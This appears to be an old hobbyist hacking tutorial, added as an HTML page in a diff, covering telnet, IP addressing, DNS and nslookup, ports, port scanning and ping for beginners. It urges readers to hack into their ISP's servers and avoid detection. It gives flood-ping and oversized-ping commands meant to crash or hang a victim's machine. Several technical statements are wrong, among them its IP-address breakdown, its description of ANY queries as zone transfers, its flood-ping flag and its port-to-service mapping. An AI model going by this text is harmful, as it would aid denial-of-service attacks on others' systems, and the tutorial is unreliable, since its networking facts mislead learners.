@@ -1,0 +1,584 @@
+<HTML>
+<HEAD>
+
+<TITLE>The Hacking Truths Manual: What they don't teach in Manuals!!!</TITLE>
+</HEAD>
+<BODY LINK="#0000ff" VLINK="#800080">
+
+<P><font face="Verdana">_____________________________________________________________________________</font></P>
+<B><P><font face="Verdana">The Hacking Truths Manual---Net Tools By Ankit Fadia &lt;<a href="mailto:ankit@bol.net.in">ankit@bol.net.in</a>&gt;</font></B><font face="Verdana"><br>
+<font size="2">BSRF = <a href="http://blacksun.box.sk">http://blacksun.box.sk</a></font><br>
+______________________________________________________________________</font></P>
+<P><font face="Verdana" size="2">Now that you know how to control the working of the Windows operating system lets go on to the basics of using Internet tools which are really useful for hacking.</font></P>
+<P><FONT face="Verdana" size=2>Well to tell you the truth, Hacking would be much more easy if you were running some sort of Unix on your machine or if you had a shell account. I am writing this guide keeping in mind the Newbies who are probably stuck with Windows and I am pretty much sure that all those of you who are Linux Geeks will have no problem in figuring out doing the same
+thing in Linux.</FONT></P>
+<P><font face="Verdana" size="2">There is a common belief amongst people that Windoze is very insecure and it sucks but then on the other hand Red Hat too is not so great in the security sphere. There are nearly 50 known exploits to get root on a Linux box. The reason why hackers have found so many holes or bugs in Windows is due to the fact the Windows is the most widely used OS in the world and the largest number of Hackers have access to Windows and the largest number of people have a go at Windoze's Security. The only thing that is in support of Linux is the fact that it is free and the concept of Open Source and well, performance. What I want to say is that Linux's performance may be better but I do not agree to what all people say about the low Windoze
+security. So what I think is that there is nothing wrong in Using a Windoze box for Hacking. Yes Linux does provide you access to some kewl hacking tools from the various shells but for Windows there are many third party freebies that allow you to do the same thing. Linux does make hacking easier but there is nothing wrong in using Windows for
+Hacking. But for all those of you who think other wise you can and if your ISP does not give shell account you can use your Dial Up PPP account to login into a third party shell
+account's get a free shell account go to <A HREF="http://www.cyberarmy.com/">www.cyberarmy.com</A> or
+<A HREF="http://www.hobbiton.org/">www.hobbiton.org</A></font></P>
+<P><font face="Verdana" size="2">Their service is pretty good.</font></P>
+<B><P><font face="Verdana" size="2">Telnet</font></P>
+</B><P><font face="Verdana" size="2">Telnet is the ultimate hacking tool which every hacker must know how to use before he can even think about Hacking into servers. Telnet is better described as a protocol which requires or runs on TCP\IP.</font></P>
+<P><font face="Verdana" size="2">It can be used to connect to remote computers and to run command line programs by simply typing commands into it’s GUI window. Telnet does not use the resources of the client’s computer but uses the resources of the server to which the client has connected. Basically it is a terminal emulation program that allows us to connect to remote computers. It is found at c:\windows\telnet.exe in Win9x systems and c:\winnt\system32\telnet.exe in NT machines.</font></P>
+<P><font face="Verdana" size="2">If the Path statement in your machine is set correctly then if you just type Telnet at the DOS prompt then it will bring a GUI Windows which actually is the Telnet program.</font></P>
+<B><P><font face="Verdana" size="2">How do I connect to remote computers using telnet?</font></P>
+</B><P><font face="Verdana" size="2">Well it is really simple to connect to remote computers using
+telnet. Well first launch the telnet application by typing telnet at the DOS prompt. Once the Telnet windows pops up click on</font> </P>
+<P><font face="Verdana" size="2">Connect&gt;Remote System then in the host name type the host
+i.e. the remote computer you want to connect to. Then in the Port select the port you want to connect to in this case leave it to Telnet. Almost always leave the TermType to vt100.</font></P>
+<P><font face="Verdana" size="2">***********************</font></P>
+<P><font face="Verdana" size="2">Hacking Tip: You may be wondering what the Term Type stands for. Well actually it represents various kinds of display units. We use vt100 as it is compatible with most monitors.</font></P>
+<P><font face="Verdana" size="2">**********************</font></P>
+<P><font face="Verdana" size="2">Then click connect and you will be connected to the remote machine.</font></P>
+<P><font face="Verdana" size="2">Now if you are a newbie you would be using the above method of telnetting to a remote computer and you would not be port surfing. Well if you really want to
+learn to hack, port surfing is a must as without learning to port surf you will not be able to find out</font> </P>
+<P><font face="Verdana" size="2">The basic syntax of the telnet command is</font> </P>
+<P><font face="Verdana" size="2">C:\&gt;telnet hostname.com</font> </P>
+
+<P><font face="Verdana" size="2">Now let’s go through this syntax, the word telnet is followed by the host name or the IP address of the host you want to connect to which is then followed by the port on the remote computer you want to connect
+to. If you are confused by the new terms read on and things will become clearer.</font></P>
+<B><P><font face="Verdana" size="2">What exactly is an IP Address?</font></P>
+</B><P><font face="Verdana" size="2">Like in the real world, everyone has got an individual Home Address or telephone number so that, that particular individual can be contacted on that number or address,
+similarly all computers connected to the Internet are given a unique Internet Protocol or IP address which can be used to contact that particular computer. In geek language an IP address would be a decimal notation that divides the 32 bit Internet addresses (IP) into four 8 bit fields.</font></P>
+<P><font face="Verdana" size="2">Does the IP address give me some information or do the numbers stand for anything?</font></P>
+<P><font face="Verdana" size="2">Let take the example of the following IP address: 202.144.49.110<br>
+Now the first part , the numbers before the first decimal i.e. 209 is the Network number or the Network Prefix.. This means that it identifies the number of the network in which the host is.<br>
+The second part i.e. 144 is the Host Number, that is it identifies the number of the host within the Network.<br>
+This means that in the same Network, the network number is same.<br>
+In order to provide flexibility in the size of the Network ,there are different classes of IP addresses:<br>
+</font>
+<Pre><font face="Verdana" size="2">Address Class               Dotted Decimal Notation Ranges 
+
+Class A ( /8 Prefixes)         1.xxx.xxx.xxx through 126.xxx.xxx.xxx 
+
+Class B ( /16 Prefixes)        128.0.xxx.xxx through 191.255.xxx.xxx
+
+Class C ( /24 Prefixes)        192.0.0.xxx through 223.255.255.xxx
+
+</font></pre>
+<font face="Verdana" size="2">
+The various classes will be more clear after reading the next few lines.</font>
+<p><font face="Verdana" size="2">Each Class A Network Address contains a 8 bit Network Prefix followed by a 24 bit host
+number. They are considered to be primitive. They are referred to as "/8''s" or just "8's" as they have a 8 bit Network prefix.</font></P>
+<P><font face="Verdana" size="2">In a Class B Network Address there is a 16 bit Network Prefix followed by a 16 bit Host number. It is
+referred to as "16's".</font></P>
+<P><font face="Verdana" size="2">A class C Network address contains a 24 bit Network Prefix and a 8 bit Host number. It is
+referred to as "24's" and is commonly used by most ISP's.</font> </P>
+<P><FONT face="Verdana" size=2>Due to the growing size of the Internet the Network Administrators faced many problems. The Internet routing tables were beginning to grow and now the administrators had to request another network number from the Internet before a new network could be installed at their site.
+</FONT></P>
+<P><FONT face="Verdana" size=2>This is where subnetting caame in. Now if your ISP is a big one and if it provides you with dynamic IP addresses then you will most probably see that whenever you log on to the net, your IP address will have the same first 24 bits and only the last 8 bits will keep changing. This is due to the fact that when subnetting comes in then the IP Addresses structure becomes:
+</FONT></P>
+<P><FONT face="Verdana" size=2>xxx.xxx.zzz.yyy
+</FONT></P>
+<P><FONT face="Verdana" size=2>where the first 2 parts are Network Prefix numbers and the zzz is the Subnet number and the yyy is the host number. So you are always connected to the same Subnet within the same Network.
+</FONT></P>
+<P><FONT face="Verdana" size=2>As a result the first 3 parts will remain same and only the last part i.e. yyy is variable.
+</FONT></P>
+<P><font face="Verdana" size="2">You may be wondering, what happeded to 127 as after 126.xxx.xxx.xxx there is straightaway 128.0.xxx.xxx.</font></P>
+<P><font face="Verdana" size="2">Well 127.0.0.1 is reserved for the loopback function, this means that it refers to the localhost, this means that if you try to telnet to 127.0.0.1 , then the Telnet client will try to connect to your own computer.</font></P>
+<P><font face="Verdana" size="2">IP addresses can be of to types Dynamic and Static.</font></P>
+<P><font face="Verdana" size="2">Now most of us connect to the Internet by dialing into our ISP through Dial up Networking and using PPP( Point to Point Protocol). Now when you connect to your ISP’s server you are assigned a unique IP number which is then used to transfer data to and from your computer. That becomes your address. Now the IP address that you are assigned changes everytime your connect to your ISP i.e. you are assigned a new different IP every time you dial into your ISP, that is how it becomes Dynamic.This means that if you have obtained the IP address of a person once, then if he disconnects and reconnects then you will have to get his IP address again.</font></P>
+<P><font face="Verdana" size="2">While other ISP’s provide you with a permanent IP address as soon as you register with them. In that case your IP remains the same every time you connect to their server and is thus known as a permanent Ip address.</font></P>
+<P><font face="Verdana" size="2">*******************</font></P>
+<P><font face="Verdana" size="2">Hacking Tip: You can find out if an IP address is a Dynamic or Static by issuing the ultimate mapping tool on the net:
+nslookup. Give the following command : nslookup hostname where hostname is substituted by an IP address and if the result is Non-Existant Host/ Domain then the IP is a Dynamic one. If it return the hostname which is human understandable then you can be pretty sure that the IP address is a static one.</font></P>
+<P><font face="Verdana" size="2">For more information on DNS lookup and nslookup read on.</font></P>
+<P><font face="Verdana" size="2">******************</font></P>
+<P><font face="Verdana" size="2">Now IP addresses are very difficult to remember, who can memorize IP addresses of all the computers he wants to connect to or the sites he wants to visit.Say for example I am sure you would find hotmail.com more easier to remember than something like 203.43.54.12. Here comes in DNS or Domain Name Systems.Read on for more info on DNS.</font></P>
+<B><P><font face="Verdana" size="2">DNS</font></P>
+</B><P><font face="Verdana" size="2">A DNS is basically a resource for converting friendly Hostnames (like, hotmail.com)which humans can easily understand, into IP addresses which machines need to communicate to the host i.e. hotmail.com</font></P>
+<P><font face="Verdana" size="2">Now what basically happens in that when you type
+<A HREF="http://www.hotmail.com/">www.hotmail.com</A> in the location bar of your browser, the browser needs to perform a lookup to find the machine readable IP address so that it can communicate with the host.This means that the browser cannot communicate with a host if it has the friendly hostname only. Without the IP address, no communication can take place. So for the lookup, the browser contacts the DNS server setup by normally by your ISP and through the resolver tries to look for the IP conversion of the hostname the user wants to contact. A DNS server is basically a server running DNS software.The server that the browser first looks for a translation is the Primary DNS server, if this primary server doesn't show any match then this server contacts another DNS server somewhere on the Internet (This becomes the Secondry DNS Server.)and looks for a match. If a match is found in the secondry server then the Primary server updates it's database so that it doesn't have to contact the Secondry server again for the same match. Each DNS server stores the hosts it has recently looked for in it's cache. Now if the Server has recently looked for a particular hostname, then it does not search for it again but just provides the browser with that information from it's cache. If the cache does not contain a particular entry, then the resolver looks for the desired entry by searching through the entire database.</font></P>
+<P><font face="Verdana" size="2">New techologies are being introduced in the DNS sphere. Now take the case of amazon.com. It is a famous and large E-company with over a million users per day.(My rough estimate.) Such large organizations have multiple IP addresses for the same domain name. Today what happens is that the DNS server returns all IP Addresses and the browser chooses a random IP from it. But this new technolofy will allow the DNS server to return the IP of the server which has the least trafiic, so as to enhanse surfing. So you can see DNS does make sense.</font></P>
+<P><font face="Verdana" size="2">You can see how time consuming the above process can be and it can really slow down your surfing process, a lot of time is being wasted when the browser contacts the DNS server and performs a lookup, so how do you fasten this process? How do you eliminate the fact that the browser will contact the DNS server each time you want to visit a site? Well the answer lies in the HOSTS file hidden in the c:\windows directory.</font></P>
+<P><font face="Verdana" size="2">You can map a machine's IP to any hostname by editing the c:\windows\hosts file(It has no extension.)on win 9.x systems, On NT the hosts file is c:\WinNT\system32\drivers\etc\hosts and on Linux it is /etc/hosts.</font></P>
+<P><font face="Verdana" size="2">A hosts file looks something like the below:</font></P>
+<P><font face="Verdana" size="2">###############################</font></P>
+<P><font face="Verdana" size="2"># Copyright (c) 1998 Microsoft Corp.</font></P>
+<P><font face="Verdana" size="2">#</font></P>
+<P><font face="Verdana" size="2"># This is a sample HOSTS file used by Microsoft TCP/IP stack for Windows98</font></P>
+<P><font face="Verdana" size="2">#</font></P>
+<P><font face="Verdana" size="2"># This file contains the mappings of IP addresses to host names. Each</font></P>
+<P><font face="Verdana" size="2"># entry should be kept on an individual line. The IP address should</font></P>
+<P><font face="Verdana" size="2"># be placed in the first column followed by the corresponding host name.</font></P>
+<P><font face="Verdana" size="2"># The IP address and the host name should be separated by at least one</font></P>
+<P><font face="Verdana" size="2"># space.</font></P>
+<P><font face="Verdana" size="2">#</font></P>
+<P><font face="Verdana" size="2"># Additionally, comments (such as these) may be inserted on individual</font></P>
+<P><font face="Verdana" size="2"># lines or following the machine name denoted by a '#' symbol.</font></P>
+<P><font face="Verdana" size="2">#</font></P>
+<P><font face="Verdana" size="2"># For example:</font></P>
+<P><font face="Verdana" size="2">#</font></P>
+<P><font face="Verdana" size="2"># 102.54.94.97 rhino.acme.com # source server</font></P>
+<P><font face="Verdana" size="2"># 38.25.63.10 x.acme.com # x client host</font></P>
+<OL>
+<OL>
+<OL>
+<OL>
+
+<LI><font face="Verdana" size="2">localhost</font></LI></OL>
+</OL>
+</OL>
+</OL>
+
+<P><font face="Verdana" size="2">#####################################</font></P>
+<P><font face="Verdana" size="2">For example, if you know that the IP address of say hotmail.com is 207.xxx.xxx.xxx., then if you add the following in the Hosts file then the browser will not perform a lookup and will starighaway have the IP to communicate with the host. So add the line:</font></P>
+<P><font face="Verdana" size="2">207.xxx.xxx.xxx <A HREF="http://www.hotmail.com/">www.hotmail.com</A></font></P>
+<P><font face="Verdana" size="2">Now your browser will connect faster to Hotmail.com. This technique can increase your surfing speed tremendously.So now that you know what a DNS is…let get on to the subject of DNS lookup and Reverse DNS lookup.</font></P>
+<P><font face="Verdana" size="2">Now Linux or any other form of Unix come with a very interesting utility known as nslookup. This can be used to gather some very valueable information about a host. For details as to how to use this tool to gather information read the man pages. Windows users can download SamSpade from
+<A HREF="http://www.samspade.com/">www.samspade.org</A> to perform a nslookup.</font></P>
+<P><font face="Verdana" size="2">Just as DNS lookup converts the hostname into IP address, a Reverse DNS Lookup converts the IP address of a host to the hostname thus we can conclude that a DNS lookup return machine readable IP addresses and a reverse DNS Lookup returns the human friendly hostname.</font></P>
+<P><font face="Verdana" size="2">****************************</font></P>
+<P><font face="Verdana" size="2">INFO: The DNS software normally runs on Port 53 of a host. So the browser connects to port 53 to perfom a DNS lookup.</font></P>
+<P><font face="Verdana" size="2">***************************</font></P>
+<B><P><font face="Verdana" size="2">NslookUp</font></P>
+</B><P><font face="Verdana" size="2">So how can you use nslookup to gain some valuable information about a host? Well the best way to learn about a particular Unix command is to read the man pages.They are the ultimate source of all Unix commands and their parameters.</font></P>
+<P><font face="Verdana" size="2">Now the first thing to do is, either get SamSpade from
+<A HREF="http://www.samspade.com/">www.samspade.org</A> or if you are using a shell account or are running any form of Unix then locate where the nslookup command is hidden by issuing the following command: ' whereis nslookup '.</font></P>
+<P><font face="Verdana" size="2">I am just giving you a general introduction to nslookup, to meanr about all Resource records or query types do read through the Man pages.</font></P>
+<P><font face="Verdana" size="2">You can use nslookup in two modes, either in the interactive mode or in the non interactive mode.First I will explain the Interactive mode. If you type nslookup at the shell prompt then it launches say, the nslookup utility or the nslookup command.</font></P>
+<P><font face="Verdana" size="2">$&gt;/usr/etc/nslookup</font></P>
+<P><font face="Verdana" size="2">Default Server: hobbiton.org</font></P>
+<P><font face="Verdana" size="2">Address: 12.12.12.12</font></P>
+<P><font face="Verdana" size="2">Now when you type just nslookup, the machine will return the IP address and the name of the server which is running the nslookup command for you,in this case it would be my shell account provider.</font></P>
+<P><font face="Verdana" size="2">Now once launching nslookup you need to specify the query type, which is the type of Resource Record</font></P>
+<P><font face="Verdana" size="2">(RR) by typing:</font></P>
+<P><font face="Verdana" size="2">set type: RR</font></P>
+<P><font face="Verdana" size="2">where RR can be any of the following:</font></P>
+<P><font face="Verdana" size="2">A : Address</font></P>
+<P><font face="Verdana" size="2">MX : Mail Exchanger</font></P>
+<P><font face="Verdana" size="2">PTR : Pointer</font></P>
+<P><font face="Verdana" size="2">CNAME: Canonical Name</font></P>
+<P><font face="Verdana" size="2">HINFO: Host Info.</font></P>
+<P><font face="Verdana" size="2">ANY : In this case a zone transfer takes place and all information of the host is returned, as a result</font> </P>
+<P><font face="Verdana" size="2">additional burden is put on the host and hence may cause the host to hang or restart.</font></P>
+<P><font face="Verdana" size="2">NOTE: To get full list of RR's read the man pages.</font></P>
+<P><font face="Verdana" size="2">Now once the RR or the type has been set, you need to type in the host name or the IP of the server you want to gather info of.</font></P>
+<P><font face="Verdana" size="2">This might not be that clear, so let me take you through an example.</font></P>
+<P><font face="Verdana" size="2">Firstly for this example I am using my Linux box and am not logged on to any shell account so my IP would be 127.0.0.1 and am doing a A type nslookup on the host hotmail.com</font></P>
+<P><font face="Verdana" size="2">$&gt;nslookup</font></P>
+<P><font face="Verdana" size="2">Server: localhost</font></P>
+<P><font face="Verdana" size="2">Address: 127.0.0.1</font></P>
+<P><font face="Verdana" size="2">&gt;set type=A</font></P>
+<P><font face="Verdana" size="2">&gt;hotmail.com</font> </P>
+<P><font face="Verdana" size="2">Server: localhost</font></P>
+<P><font face="Verdana" size="2">Address: 127.0.0.1</font></P>
+<P><font face="Verdana" size="2">Note: I have typed whatever is after &gt; and other lines are written by the computer.</font> </P>
+<P><font face="Verdana" size="2">This will return the address info of the host hotmail.com. Do try it out and see what you get.</font></P>
+<P><font face="Verdana" size="2">Now if we want to run nslookup in Non Interactive Mode, then we have to write the command in the following format:</font></P>
+<P><font face="Verdana" size="2">$&gt;nslookup Hostname</font></P>
+<P><font face="Verdana" size="2">Now in all the above examples, we did a normal DNS lookup on the host. We can also use nslookup to perform a reverse DNS lookup by instead of mentioning the Hostname, by mentioning the IP of the host.</font></P>
+<P><font face="Verdana" size="2">Eg.</font></P>
+<P><font face="Verdana" size="2">$&gt;nslookup IP address</font></P>
+<P><font face="Verdana" size="2">Now that you have understood the whole concept of DNS you know what happens when we issue the /dns command in IRC.</font></P>
+<P><font face="Verdana" size="2">There is yet another Unix utility or command called DIG or Domain Information Groper which too like nslookup gives info on the host. It too is a part of SamSpade.</font></P>
+<B><P><font face="Verdana" size="2">Ports</font></P>
+</B><P><font face="Verdana" size="2">Now that you no what an IP is and what DNS or the hostname is, lets move on to Ports.</font></P>
+<P><font face="Verdana" size="2">There are basically two kinds of ports--Physical(HardWare) and Virtual (Software) You may be knowing ports to be the slots behind your CPU to which you connect your Mouse or Keyboard or your monitor. Well they are physical Hardware real ports.The ports we Hackers are interested with are virtual software ports.A port is a virtual pipe through which information goes in and out. A particular computer can have a large number of ports. All ports are numbered.</font></P>
+<P><font face="Verdana" size="2">Now at each port a particular service is running. A software which runs on a port is called a service. So how do you know which service is running on which port. Well all ports are numbered and there is a general rule which almost everyone follows which decides which service usually runs at which port.</font></P>
+<P><font face="Verdana" size="2">Some popular ports and services running are:</font></P>
+<font face="Verdana" size="2">
+Ping 7<br>
+Systat 11<br>
+Time 13<br>
+NetStat 15<br>
+SSH 22 (This is same as Secure Shell Login)<br>
+Telnet 23<br>
+SMTP 25<br>
+Whois 43 <br>
+Finger 79<br>
+HTTP 80<br>
+POP 110<br>
+NNTP 119<br>
+IDENT 139<br>
+rlogin 513 (IP Spoofing can be used here.)<br>
+</font>
+<P><font face="Verdana" size="2">&nbsp;<br>
+</font>
+<P><font face="Verdana" size="2">To get an entire list of port numbers and the corressponding service running at that particular port, read RFC 1700 .</font></P>
+<P><font face="Verdana" size="2">Ports under 1024 usually have popular well known services running on them. The higher port numbers are used say, when your browser needs to connect to a remote server maybe when the browser connects to port 80 of the remote server and requests for the default webpage. So in these cases the browser chooses a random port above 1024.</font></P>
+<P><font face="Verdana" size="2">************</font></P>
+<P><font face="Verdana" size="2">Newbie Note: What the hell is a RFC? Well RFC stands for Request For Comment. They are texts which cover each and every aspect of Networking and the Internet. They are written by geeks and if you want to become an uberhacker then you will have to by hear all RFC’s. All these new terms and the whole TCP\IP protocol may sound weird and difficult to grasp but if you want to be a good hacker then you will have to stay with them the rest of your lives.To locate a RFC just go to your fav search engine and type the RFC number.</font></P>
+<P><font face="Verdana" size="2">*************</font></P>
+<P><font face="Verdana" size="2">*************</font></P>
+<P><font face="Verdana" size="2">NewBie Note:</font></P>
+<P><font face="Verdana" size="2">What is a Daemon?</font></P>
+<P><font face="Verdana" size="2">Well a daemon is a program that runs in the background at many Unix ports. If you find a service or a daemon running at a port, I am sure that computer is hackable.</font></P>
+<P><font face="Verdana" size="2">*************</font></P>
+<B><P><font face="Verdana" size="2">Port Scanning &amp; Port Surfing</font></P>
+</B><P><font face="Verdana" size="2">Now that you know everything about Telnet and have some basic Networking knowledge lets have some fun by learning to Port Surf. It is the first basic step in finding a hackable server running a daemon with a hole or a vulnerability.</font></P>
+<P><font face="Verdana" size="2">Say you want to hack into your ISP’s server, what do you do? You firstly find out the hostnames of the servers runned by your ISP. Now each server can have a large umber of open ports and it would take days to manually go to each port and then find out that no service is running at that port. So here come in the Port Scanning Utilities which give a list of open ports on a server. Some port scanners alongwith the list of open ports also gives the services running on each port and it’s vulnerabilties, if any.</font> </P>
+<P><font face="Verdana" size="2">Now port scanning takes advantage the 3-stage TCP handshake to determine what ports are open on the remote computer. To learn more about the TCP\IP protocol read the networking manuals that I distribute on my mailing list.</font></P>
+<P><font face="Verdana" size="2">Tools like SATAN and lots of them more allow you to find out the list of open ports, the daemon or the service running at each open port and also the service’s vulnerability at the click of a button. You can’t call yourself a hacker if you need some Software which first of all is not written by you to do something as lame as a port scan. Well yes I do agree that looking for open ports on a server would take a long time. But what I am suggesting is that you use a Port scanning tool which just gives you a list of open ports without the list of services and the vulnerabilities.</font></P>
+<P><font face="Verdana" size="2">I assure you, if you try and explore an open port of a remote server manually, you will be able to learn more about the remote system and also it will give you a taste of what hacking actually is.</font></P>
+<P><font face="Verdana" size="2">If you use a port scanner which gives you all details at the click of a button to impres your friends, let me assure you none of them will be impressed as I am sure anyone can use SATAN and other such scanners.</font></P>
+<P><font face="Verdana" size="2">Another thing you need to be careful about before port scanning your ISP is that most port scanners are very easily detected and can easily be traced and you have no excuse if you are caught doing a port scan on a host., it a sure sign of Hacker Activity.There are many stealth scanners like Nmap which claim to be untraceable. But the truth is that they are very much traceable and they are quite inaccurate as they send only a single packet to check if a port is open or not. And if the host is running the right kind of Sniffer software maybe Etherpeek then the Port scan can be easily detected and the IP of the user logged. Anyway some ISP’s are really afraid of Hacking activites and even at the slightest hint of some suspicious hacking activity something like Port scannng, they can remove your account.So just be careful.</font></P>
+<P><font face="Verdana" size="2">************</font></P>
+<P><font face="Verdana" size="2">Evil Hacking Trick: Well try to keep an eye on TCP port 12345, and UDP port 31337 these are the default ports for the popular trojans NetBus and BO, respectively</font></P>
+<P><font face="Verdana" size="2">*************</font></P>
+<P><font face="Verdana" size="2">Some ISP’s are quite aware of Hacking Activites and are one step ahead. They may be running some excellent software which will keep hackers away. EtherPeek is an excellent example of a sniffing software which can easily trace users who are port scanning. Nuke Nabber a Windows freeware claims to be able to block Port Scans. I have not tested it so I can't say for sure. Then there is another fun program known as Port Dumper which can fake daemon( services) like Telnet, Finger etc.</font></P>
+<B><P><font face="Verdana" size="2">How can I find out my own IP address and what ports are open on my machine?</font></P>
+</B><P><font face="Verdana" size="2">All this talk about IP's and ports may have made you quite interested in this subect and you may be dying to find out a method of finding out open ports on your machine and your own IP address.</font></P>
+<P><font face="Verdana" size="2">Well just type the following at the DOS prompt (Windows users) or the bash prompt (Unix users):</font></P>
+<P><font face="Verdana" size="2">netstat -a</font></P>
+<P><font face="Verdana" size="2">This will return something like the following:</font></P><pre><font face="Verdana" size="2">
+</font></pre>
+<P><font face="Verdana" size="2">C:\WINDOWS>netstat -a
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    ankit-s-hax-box:1030   0.0.0.0:0              LISTENING
+  TCP    ankit-s-hax-box:1033   0.0.0.0:0              LISTENING
+  TCP    ankit-s-hax-box:1027   0.0.0.0:0              LISTENING
+  TCP    ankit-s-hax-box:1030   mail2.mtnl.net.in:pop3  ESTABLISHED
+  TCP    ankit-s-hax-box:1033   zztop.boxnetwork.net:80  CLOSE_WAIT
+  TCP    ankit-s-hax-box:137    0.0.0.0:0              LISTENING
+  TCP    ankit-s-hax-box:138    0.0.0.0:0              LISTENING
+  TCP    ankit-s-hax-box:nbsession  0.0.0.0:0              LISTENING
+  UDP    ankit-s-hax-box:1027   *:*
+  UDP    ankit-s-hax-box:nbname  *:*
+  UDP    ankit-s-hax-box:nbdatagram  *:*</font>
+<B><P><font face="Verdana" size="2">Sockets and Ports Explained</font></P>
+</B><P><font face="Verdana" size="2">Note: I am assuming that you have at least some knowledge about TCP\IP.</font></P>
+<P><font face="Verdana" size="2">What is all the hype about socket programming? What exactly are sockets? TCP\IP or Transmission Control Protocol\ Internet Protocol is the language or the protocol used by computers to communicate with each other over the Internet. Say a computer whose IP address is 99.99.99.99 wants to communicate with another machine whose IP address is 98.98.98.98 then would will happen?</font></P>
+<P><font face="Verdana" size="2">The machine whose IP is 99.99.99.99 sends a packet addressed to another machine whose IP is 98.98.98.98. When 98.98.98.98 receives the packet then it verifies that it got the message by sending a signal back to 99.99.99.99.</font></P>
+<P><font face="Verdana" size="2">But say the person who is using 99.99.99.99 wants to have simunateously more than one connections to 98.98.98.98…..then what will happen? Say 99.99.99.99 wants to connect to the FTP daemon and download a file by FTP and at the same time it wants to conect to 98.98.98.98's website i.e. connect to HTTP daemon. Then 98.98.98.98. will have 2 connects with 99.99.99.99 simountaneously.Now how can 98.98.98.98. distinguish between the two connections…how does 98.98.98.98. know which is for the FTP daemon and which for the HTTP daemon? If there was no way to distinguish between the two connections then they would both get mixed up and there would be a lot of chaos with the message meant for thr HTTP daemon going to the FTP daemon. To avoid such confusion there are ports. At each port a particular service or daemon is runningby default. So now that the 99.99.99.99 computers knows which port to connect to, to download a FTP file and which port to connect to, to download the web page, it will communciate with the 98.98.98.98 machine using what is known as the socket pair which is a combination of an IP address and a Port. So in the above case the message which is meant for the FTP daemon will be addressed to 98.98.98.98 : 21 (Notice the colon and the default FTP port suceeding it.). So that the receiving machine i.e. 98.98.98.98 will know for which service this message is meant for and to which port it should be directed to.</font></P>
+<P><font face="Verdana" size="2">In TCP\IP or over the Internet all communication is done using the Socket pair i.e. the combination of the IP address and the port.</font> </P>
+<B><P><font face="Verdana" size="2">DOS Hacking utilities shipping with Windows and Linux Utilities too</font></P>
+</B><P><font face="Verdana" size="2">Most Hacker Friendly utilities that ship with Windoze are hidden and a normal user will not be able to find them.All of them are either in the c:\windows directory or are in the Windows Installation CD.</font></P>
+<B><P><font face="Verdana" size="2">PING</font></P>
+</B><P><font face="Verdana" size="2">Now lets start with what exactly Ping is. Now Ping is a part of the ICMP protocol i.e the Internet Control Message Protocol. ICMP is a protocol used to troubleshoot TCP\IP networks. Ping is a command which sends out a datagram to the specified host. This specified host if alive i.e. turned on sends out a reply or echos off the same Datagram. If the datagram that reaches back to your computer has the same datagram that was sent then it means that the host is alive. So Ping is basically a command which allows you to check if a host is alive or not. It can also be used to calculate the amount of time taken for a datagram to reach the host. It is so deadly that it can be used to ping a hostname perpetually which may even cause the host to crash. Now what happens is that when a host receives a Ping signal, it allocates some of it's resources to attend to or to echo back the datagram. Now if you Ping a host perpetually, then a time will come when all resources of the host are used and the host either hangs or restarts.</font></P>
+<P><font face="Verdana" size="2">Due to Ping's deadly nature, most shell account ISP's hide the Ping utility. To find it issue the folowing command:</font></P>
+<P><font face="Verdana" size="2">wheris ping</font></P>
+<P><font face="Verdana" size="2">It is usually hidden in /usr/etc</font></P>
+<P><font face="Verdana" size="2">Ping has many parameters and a list of parameters can be found by reading the man pages or if you are running Windows you can get help by simply typing ping at the DOS prompt.</font></P>
+<P><font face="Verdana" size="2">The flood ping which pings a host perpetually is:</font></P>
+<P><font face="Verdana" size="2">ping -f hostname</font></P>
+<P><font face="Verdana" size="2">ping -a hostname can be used to resolve addresses to hostnames.</font></P>
+<P><font face="Verdana" size="2">When I typed ping at the dos prompt I go the following help:</font></P>
+<P><font face="Verdana" size="2">C:\WINDOWS&gt;ping</font></P>
+<P><font face="Verdana" size="2">Usage: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]</font></P>
+<P><font face="Verdana" size="2">[-r count] [-s count] [[-j host-list] | [-k host-list]]</font></P>
+<P><font face="Verdana" size="2">[-w timeout] destination-list</font></P>
+<P><font face="Verdana" size="2">Options:</font></P>
+<P><font face="Verdana" size="2">-t Ping the specifed host until stopped.</font></P>
+<P><font face="Verdana" size="2">To see statistics and continue - type Control-Break;</font></P>
+<P><font face="Verdana" size="2">To stop - type Control-C.</font></P>
+<P><font face="Verdana" size="2">-a Resolve addresses to hostnames.</font></P>
+<P><font face="Verdana" size="2">-n count Number of echo requests to send.</font></P>
+<P><font face="Verdana" size="2">-l size Send buffer size.</font></P>
+<P><font face="Verdana" size="2">-f Set Don't Fragment flag in packet.</font></P>
+<P><font face="Verdana" size="2">-i TTL Time To Live.</font></P>
+<P><font face="Verdana" size="2">-v TOS Type Of Service.</font></P>
+<P><font face="Verdana" size="2">-r count Record route for count hops.</font></P>
+<P><font face="Verdana" size="2">-s count Timestamp for count hops.</font></P>
+<P><font face="Verdana" size="2">-j host-list Loose source route along host-list.</font></P>
+<P><font face="Verdana" size="2">-k host-list Strict source route along host-list.</font></P>
+<P><font face="Verdana" size="2">-w timeout Timeout in milliseconds to wait for each reply.</font></P>
+<P><font face="Verdana" size="2">You can even Ping yourself. Earlier I had told you guys that the IP 127.0.0.1 is the local host, this means that when you connect to 127.0.0.1 then you actually connect to your own machine.</font></P>
+<P><font face="Verdana" size="2">So to ping yourself perpetually , issue the following command:</font></P>
+<P><font face="Verdana" size="2">ping -f 127.0.0.1</font></P>
+<P><font face="Verdana" size="2">Well actually the Flood ping no longer works on most OS's as they have be updated.</font></P>
+<P><font face="Verdana" size="2">The following Ping command creates a giant datagram of the size 65510 for Ping. It might hang the victim's computer.</font></P>
+<P><font face="Verdana" size="2">C:\windows&gt;ping -l 65510</font></P>
+<B><P><font face="Verdana" size="2">Tracert</font></P>
+</B><P><font face="Verdana" size="2">When you type hotmail.com in your browser, then your request passes through a large number of Computers before reaching hotmail.com. Or when you login to your Shell account and type the password then this password passes through a large number of computers before reaching the shell account server.</font></P>
+<P><font face="Verdana" size="2">To find out the list of servers your password of the request passes through, you can use the tracert command. In Unix you can use the traceroute command. Again I got help by simply typing tracert at the DOS prompt.</font></P>
+<P><font face="Verdana" size="2">C:\WINDOWS&gt;tracert</font></P>
+<P><font face="Verdana" size="2">Usage: tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</font></P>
+<P><font face="Verdana" size="2">Options:</font></P>
+<P><font face="Verdana" size="2">-d Do not resolve addresses to hostnames.</font></P>
